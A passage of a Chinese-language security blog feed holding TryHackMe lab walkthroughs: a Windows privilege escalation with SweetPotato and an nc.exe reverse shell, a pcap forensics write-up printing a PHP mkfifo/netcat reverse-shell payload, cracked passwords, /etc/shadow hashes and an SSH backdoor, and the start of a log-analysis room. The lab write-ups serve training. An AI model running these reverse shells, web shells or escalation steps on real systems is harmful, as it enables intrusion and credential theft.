class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\edwardle.WINDCORP\desktop&gt; <br><br>whoami /all<br><br> <br>USER INFORMATION<br><br><span class="hljs-literal">----------------</span><br><br><br>User Name         SID                                         <br><br>================= ============================================<br><br>windcorp\edwardle S<span class="hljs-literal">-1-5-21-555431066-3599073733-176599750-5771</span><br> <br><span class="hljs-built_in">GROUP</span> INFORMATION<br><br><span class="hljs-literal">-----------------</span><br><br><span class="hljs-built_in">Group</span> Name                                 <span class="hljs-built_in">Type</span>             SID                                          Attributes    <br><br>                                    <br><br>========================================== ================ ============================================ ==============<br><br>====================================<br><br>Everyone                                   Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-1-0</span>                                      Mandatory grou<br><br>p, Enabled by default, Enabled <span class="hljs-built_in">group</span><br><br>BUILTIN\Users                              Alias            S<span class="hljs-literal">-1-5-32-545</span>                                 Mandatory grou<br><br>p, Enabled by default, Enabled <span class="hljs-built_in">group</span><br><br>BUILTIN\Pre<span class="hljs-literal">-Windows</span> <span class="hljs-number">2000</span> Compatible Access Alias            S<span class="hljs-literal">-1-5-32-554</span>                                 Mandatory grou<br><br>p, Enabled by default, Enabled <span class="hljs-built_in">group</span><br><br>BUILTIN\Account Operators                  Alias            S<span class="hljs-literal">-1-5-32-548</span>                                 Mandatory grou<br><br>p, Enabled by default, Enabled <span class="hljs-built_in">group</span><br><br>BUILTIN\Remote Desktop Users               Alias            S<span class="hljs-literal">-1-5-32-555</span>                                 Mandatory grou<br><br>p, Enabled by default, Enabled <span class="hljs-built_in">group</span><br><br>BUILTIN\Remote Management Users            Alias            S<span class="hljs-literal">-1-5-32-580</span>                                 Mandatory grou<br><br>p, Enabled by default, Enabled <span class="hljs-built_in">group</span><br><br>NT AUTHORITY\NETWORK                       Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-2</span>                                      Mandatory grou<br><br>p, Enabled by default, Enabled <span class="hljs-built_in">group</span><br><br>NT AUTHORITY\Authenticated Users           Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-11</span>                                     Mandatory grou<br><br>p, Enabled by default, Enabled <span class="hljs-built_in">group</span><br><br>NT AUTHORITY\This Organization             Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-15</span>                                     Mandatory grou<br><br>p, Enabled by default, Enabled <span class="hljs-built_in">group</span><br><br>WINDCORP\IT                                <span class="hljs-built_in">Group</span>            S<span class="hljs-literal">-1-5-21-555431066-3599073733-176599750-5865</span> Mandatory grou<br><br>p, Enabled by default, Enabled <span class="hljs-built_in">group</span><br><br>Authentication authority asserted identity Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-18-1</span>                                     Mandatory grou<br><br>p, Enabled by default, Enabled <span class="hljs-built_in">group</span><br><br>Mandatory Label\High Mandatory Level       Label            S<span class="hljs-literal">-1-16-12288</span>                                               <br><br>                                    <br><br> <br><br> <br><br>PRIVILEGES INFORMATION<br><br><span class="hljs-literal">----------------------</span><br><br> <br><br>Privilege Name                Description                               State  <br><br>============================= ========================================= =======<br><br>SeMachineAccountPrivilege     Add workstations to domain                Enabled<br><br>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled<br><br>SeImpersonatePrivilege        Impersonate a client after authentication Enabled<br><br>SeIncreaseWorkingSetPrivilege Increase a <span class="hljs-keyword">process</span> working <span class="hljs-built_in">set</span>            Enabled<br><br> <br><br> <br><br>USER CLAIMS INFORMATION<br><br><span class="hljs-literal">-----------------------</span><br><br> <br><br>User claims unknown.<br><br> <br><br>Kerberos support <span class="hljs-keyword">for</span> Dynamic Access Control on this device has been disabled.<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs powershell"> <br><br><span class="hljs-built_in">PS</span> C:\Users\edwardle.WINDCORP&gt; <br><br><span class="hljs-built_in">cd</span> Downloads<br><br><span class="hljs-built_in">PS</span> C:\Users\edwardle.WINDCORP\Downloads&gt; <br><br><span class="hljs-built_in">ls</span><br><br> <br><br> <br><br>    Directory: C:\Users\edwardle.WINDCORP\Downloads<br><br> <br><br> <br><br>Mode                LastWriteTime         Length Name                                                                  <br><br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span>                                                                  <br><br><span class="hljs-literal">-a----</span>        <span class="hljs-number">5</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">12</span>:<span class="hljs-number">53</span> PM          <span class="hljs-number">59392</span> nc.exe                                                                <br><br><span class="hljs-literal">-a----</span>        <span class="hljs-number">5</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">12</span>:<span class="hljs-number">37</span> PM        <span class="hljs-number">1761792</span> NtApiDotNet.dll                                                       <br><br><span class="hljs-literal">-a----</span>        <span class="hljs-number">5</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">12</span>:<span class="hljs-number">38</span> PM         <span class="hljs-number">153600</span> SweetPotato.exe                                                       <br><span class="hljs-built_in">PS</span> C:\Users\edwardle.WINDCORP\Downloads&gt;.\SweetPotato.exe <span class="hljs-literal">-p</span> nc.exe <span class="hljs-literal">-a</span> <span class="hljs-string">&quot;-e cmd 10.11.75.230 4444&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bat">$ nc -lvnp <span class="hljs-number">4444</span><br><span class="hljs-function">Ncat: <span class="hljs-title">Version</span> 7.92 ( <span class="hljs-title">https</span>://<span class="hljs-title">nmap.org</span>/<span class="hljs-title">ncat</span> )</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Listening</span> <span class="hljs-title">on</span> :::4444</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Listening</span> <span class="hljs-title">on</span> 0.0.0.0:4444</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Connection</span> <span class="hljs-title">from</span> 10.10.173.196.</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Connection</span> <span class="hljs-title">from</span> 10.10.173.196:57265.</span><br><span class="hljs-function"><span class="hljs-title">Microsoft</span> <span class="hljs-title">Windows</span> [<span class="hljs-title">Version</span> 10.0.17763.1158]</span><br><span class="hljs-function">(<span class="hljs-title">c</span>) 2018 <span class="hljs-title">Microsoft</span> <span class="hljs-title">Corporation</span>. <span class="hljs-title">All</span> <span class="hljs-title">rights</span> <span class="hljs-title">reserved</span>.</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">system32</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">C:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span>\<span class="hljs-title">Desktop</span>&gt;<span class="hljs-title">type</span> &quot;<span class="hljs-title">Flag</span> 3.<span class="hljs-title">txt</span>&quot;</span><br><span class="hljs-function"><span class="hljs-title">type</span> &quot;<span class="hljs-title">Flag</span> 3.<span class="hljs-title">txt</span>&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TryHackMe Walkthrough - Overpass 2 - Hacked</title>
    <link href="/post/Tryhackme-Overpass-2---Hacked.html"/>
    <url>/post/Tryhackme-Overpass-2---Hacked.html</url>
    
    <content type="html"><![CDATA[<p>天桥被黑了！SOC 团队（Paradox，恭喜升职）在查看 shibes 时注意到深夜班的可疑活动，并设法在攻击发生时捕获数据包。</p><p>你能弄清楚攻击者是如何进入的，然后黑进 Overpass 的生产服务器吗？</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220721142324872.png" alt="image-20220721142324872"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220721142453290.png" alt="image-20220721142453290"></p><p>192.168.170.159是服务器，192.168.170.145应该是攻击者的IP。很明细的三次TCP握手+一个GET请求。这是攻击者是初来乍到。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220721142915208.png" alt="image-20220721142915208"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220721143020872.png" alt="image-20220721143020872"></p><p>追踪TCP流一目了然。以post方式对&#x2F;development&#x2F;upload.php上传了一个文件名为payload.php,内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将其shell反弹到了4242端口。然后攻击者访问了&#x2F;development&#x2F;uploads&#x2F;路径，该路径应该存在路径遍历漏洞。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220721143536485.png" alt="image-20220721143536485"></p><p>紧随其后的它点击访问了payload.php建立了反向shell。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220721143638826.png" alt="image-20220721143638826"></p><p>服务器开放了端口号为57680，与攻击者4242端口进行通信。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http">/bin/sh: 0: can&#x27;t access tty; job control turned off<br>$ id<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>$ python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@overpass-production:/var/www/html/development/uploads$ ls -lAh<br>ls -lAh<br>total 8.0K<br>-rw-r--r-- 1 www-data www-data 51 Jul 21 17:48 .overpass<br>-rw-r--r-- 1 www-data www-data 99 Jul 21 20:34 payload.php<br>www-data@overpass-production:/var/www/html/development/uploads$ cat .overpass<br>cat .overpass<br>,LQ?2&gt;6QiQ$JDE6&gt;Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN.www-data@overpass-production:/var/www/html/development/uploads$ su james<br>su james<br><span class="hljs-attribute">Password</span><span class="hljs-punctuation">: </span>whenevernoteartinstant<br></code></pre></td></tr></table></figure><p>然后在服务器&#x2F;var&#x2F;www&#x2F;html&#x2F;development&#x2F;uploads目录下发现保存加密口令的密码文件.overpass并破译了密码为</p><p>whenevernoteartinstant。然后切换到了用户james登录服务器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">james@overpass-production:~$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> james: whenevernoteartinstant<br><br>Matching Defaults entries <span class="hljs-keyword">for</span> james on overpass-production:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User james may run the following commands on overpass-production:<br>    (ALL : ALL) ALL<br>james@overpass-production:~$ sudo <span class="hljs-built_in">cat</span> /etc/shadow<br>sudo <span class="hljs-built_in">cat</span> /etc/shadow<br>root:*:18295:0:99999:7:::<br>daemon:*:18295:0:99999:7:::<br>bin:*:18295:0:99999:7:::<br>sys:*:18295:0:99999:7:::<br><span class="hljs-built_in">sync</span>:*:18295:0:99999:7:::<br>games:*:18295:0:99999:7:::<br>man:*:18295:0:99999:7:::<br>lp:*:18295:0:99999:7:::<br>mail:*:18295:0:99999:7:::<br>news:*:18295:0:99999:7:::<br>uucp:*:18295:0:99999:7:::<br>proxy:*:18295:0:99999:7:::<br>www-data:*:18295:0:99999:7:::<br>backup:*:18295:0:99999:7:::<br>list:*:18295:0:99999:7:::<br>irc:*:18295:0:99999:7:::<br>gnats:*:18295:0:99999:7:::<br>nobody:*:18295:0:99999:7:::<br>systemd-network:*:18295:0:99999:7:::<br>systemd-resolve:*:18295:0:99999:7:::<br>syslog:*:18295:0:99999:7:::<br>messagebus:*:18295:0:99999:7:::<br>_apt:*:18295:0:99999:7:::<br>lxd:*:18295:0:99999:7:::<br>uuidd:*:18295:0:99999:7:::<br>dnsmasq:*:18295:0:99999:7:::<br>landscape:*:18295:0:99999:7:::<br>pollinate:*:18295:0:99999:7:::<br>sshd:*:18464:0:99999:7:::<br>james:$6<span class="hljs-variable">$7GS5e</span>.yv<span class="hljs-variable">$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu</span>/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::<br>paradox:$6$oRXQu43X<span class="hljs-variable">$WaAj3Z</span>/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::<br>szymex:$6<span class="hljs-variable">$B</span>.EnuXiO<span class="hljs-variable">$f</span>/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::<br>bee:$6$.SqHrp6z<span class="hljs-variable">$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0</span>:18464:0:99999:7:::<br>muirland:$6$SWybS8o2<span class="hljs-variable">$9diveQinxy8PJQnGQQWbTNKeb2AiSp</span>.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::<br></code></pre></td></tr></table></figure><p>然后执行sudo -l 发现james可以sudo使用任何命令。查看了shadow密码文件。然后克隆了以下URL地址的资源：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/NinjaJc01/</span>ssh-backdoor<br></code></pre></td></tr></table></figure><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">james<span class="hljs-meta">@overpass-production:~$</span> cd ssh-backdoor<br>cd ssh-backdoor<br>james<span class="hljs-meta">@overpass-production:~/ssh-backdoor$</span> ssh-keygen<br>ssh-keygen<br>Generating public/private rsa key pair.<br>Enter file in which to save the key (/home/james/.ssh/id_rsa): id_rsa<br>id_rsa<br>Enter passphrase (empty for no passphrase): <br><br>Enter same passphrase again: <br><br>Your identification has been saved in id_rsa.<br>Your public key has been saved in id_rsa.pub.<br>The key fingerprint is:<br>SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58 james<span class="hljs-meta">@overpass-production</span><br>The key&#x27;s randomart image is:<br>+---[RSA 2048]----+<br>|<span class="hljs-string">        .. .     </span>|<br>|<span class="hljs-string">       .  +      </span>|<br>|<span class="hljs-string">      o   .=.    </span>|<br>|<span class="hljs-string">     . o  o+.    </span>|<br>|<span class="hljs-string">      + S +.     </span>|<br>|<span class="hljs-string">     =.o %.      </span>|<br>|<span class="hljs-string">    ..*.% =.     </span>|<br>|<span class="hljs-string">    .+.X+*.+     </span>|<br>|<span class="hljs-string">   .oo=++=Eo.    </span>|<br>+----[SHA256]-----+<br>james<span class="hljs-meta">@overpass-production:~/ssh-backdoor$</span> chmod +x backdoor<br>chmod +x backdoor<br>james<span class="hljs-meta">@overpass-production:~/ssh-backdoor$</span> ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed<br><br><span class="hljs-variable">&lt;9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed</span><br><span class="hljs-variable">SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222</span><br></code></pre></td></tr></table></figure><p>并生成了一对SSH秘钥，然后在服务器2222端口启动监听了一个ssh后门。到github查看对应后门的配置，其加密代码为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">func hashPassword(password string, salt string) string &#123;<br><span class="hljs-built_in">hash</span> := sha512.Sum512([]byte(password + salt))<br><span class="hljs-built_in">return</span> fmt.Sprintf(<span class="hljs-string">&quot;%x&quot;</span>, <span class="hljs-built_in">hash</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>硬编码在下边：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">func passwordHandler(_ ssh.Context, password string) bool &#123;<br><span class="hljs-built_in">return</span> verifyPass(<span class="hljs-built_in">hash</span>, <span class="hljs-string">&quot;1c362db832f3f864c8c2fe05f2002a05&quot;</span>, password)<br>&#125;<br></code></pre></td></tr></table></figure><p>那攻击者完整的SHA512哈希应该是：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">6</span>d<span class="hljs-number">05358</span>f<span class="hljs-number">090</span>eea<span class="hljs-number">56</span>a<span class="hljs-number">238</span>af<span class="hljs-number">02e47</span>d<span class="hljs-number">44</span>ee<span class="hljs-number">5489</span>d<span class="hljs-number">234810</span>ef<span class="hljs-number">6240280857</span>ec<span class="hljs-number">69712</span>a<span class="hljs-number">3e5</span>e<span class="hljs-number">370</span>b<span class="hljs-number">8</span>a<span class="hljs-number">41899</span>d<span class="hljs-number">0196</span>ade<span class="hljs-number">16</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>d<span class="hljs-number">54327</span><span class="hljs-keyword">c</span><span class="hljs-number">5654019292</span>cbfe<span class="hljs-number">0</span>b<span class="hljs-number">5e98</span>ad<span class="hljs-number">1</span>fec<span class="hljs-number">71</span>bed:<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">362</span>db<span class="hljs-number">832</span>f<span class="hljs-number">3</span>f<span class="hljs-number">864</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>fe<span class="hljs-number">05</span>f<span class="hljs-number">2002</span>a<span class="hljs-number">05</span><br></code></pre></td></tr></table></figure><p>那么：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HTB$ hashcat --force -m 1710 -a 0 hash.txt /usr/share/wordlists/rockyou.txt    <br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 2 MB<br><br>Dictionary cache built:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: 14344392<br>* Bytes.....: 139921507<br>* Keyspace..: 14344385<br>* Runtime...: 2 secs<br><br>6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16<br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 1710 (sha512(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$salt</span>))<br>Hash.Target......: 6d05358f090eea56a238af02e47d44ee5489d234810ef624028...002a05<br></code></pre></td></tr></table></figure><p>我需要把失陷的服务器拿回来：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220721150216065.png" alt="image-20220721150216065"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">james@overpass-production:/home/james$ python3 CVE-2021-2043.py <br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)<br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Digital Forensics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TryHackMe Walkthrough - Juicy Details</title>
    <link href="/post/TryHackMe-Juicy-Details.html"/>
    <url>/post/TryHackMe-Juicy-Details.html</url>
    
    <content type="html"><![CDATA[<h3 id="Juicy-Details"><a href="#Juicy-Details" class="headerlink" title="Juicy Details"></a>Juicy Details</h3><p>您被聘为世界上最大的果汁店之一的 SOC 分析师，并且攻击者已进入您的网络。 </p><p>你的任务是：</p><ul><li>找出攻击者使用了哪些技术和工具</li><li>哪些端点易受攻击</li><li>从环境中访问和窃取了哪些敏感数据</li></ul><p>首先映入眼帘的是一大堆SSH认证失败的日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apr 11 09:38:29 thunt sshd[8162]: Failed password <span class="hljs-keyword">for</span> www-data from 192.168.10.5 port 40066 ssh2<br>Apr 11 09:38:30 thunt sshd[8162]: Failed password <span class="hljs-keyword">for</span> www-data from 192.168.10.5 port 40066 ssh2<br>Apr 11 09:38:30 thunt sshd[8162]: Connection closed by authenticating user www-data 192.168.10.5 port 40066 [preauth]<br>Apr 11 09:39:01 thunt CRON[8164]: pam_unix(cron:session): session opened <span class="hljs-keyword">for</span> user root by (uid=0)<br>Apr 11 09:39:01 thunt CRON[8164]: pam_unix(cron:session): session closed <span class="hljs-keyword">for</span> user root<br>Apr 11 09:39:35 thunt sshd[8224]: Received disconnect from 192.168.10.5 port 40070:11: Bye Bye [preauth]<br>Apr 11 09:39:35 thunt sshd[8224]: Disconnected from authenticating user www-data 192.168.10.5 port 40070 [preauth]<br>Apr 11 09:39:35 thunt sshd[8232]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:35 thunt sshd[8234]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:35 thunt sshd[8229]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:35 thunt sshd[8237]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:35 thunt sshd[8235]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:35 thunt sshd[8228]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:35 thunt sshd[8230]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:35 thunt sshd[8231]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:35 thunt sshd[8233]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:35 thunt sshd[8227]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:35 thunt sshd[8226]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 11 09:39:35 thunt sshd[8236]: pam_unix(sshd:auth): authentication failure; <span class="hljs-built_in">logname</span>= uid=0 euid=0 <span class="hljs-built_in">tty</span>=ssh ruser= rhost=192.168.10.5  user=www-data<br>Apr 